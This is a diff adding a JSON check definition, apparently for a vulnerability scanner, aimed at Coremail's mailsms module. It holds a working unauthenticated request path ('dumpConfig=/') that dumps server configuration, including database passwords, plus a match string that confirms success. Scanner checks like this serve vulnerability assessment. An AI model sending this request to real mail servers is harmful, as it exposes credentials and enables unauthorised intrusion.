@@ -1,0 +1,23 @@
+{
+    "target":"coremail",
+    "meta":{
+        "name":    "coremail 配置文件读取",
+        "remarks": "cmailsms功能存在未授权的配置文件读取漏洞，可读取包括数据库密码在内的敏感配置信息。",
+        "level":   1,
+        "type":    "INFO",
+        "author":   "wolf",
+        "references": {
+            "url":"",
+            "cve":"",
+            "kpid":"KP-0085"
+        }
+    },
+    "request":{
+        "path":     "/mailsms/s?func=ADMIN:appState&dumpConfig=/",
+        "postData": ""
+    },
+    "verify":{
+        "type":  "string",
+        "match": "MainAdminSvrHost"
+    }
+}
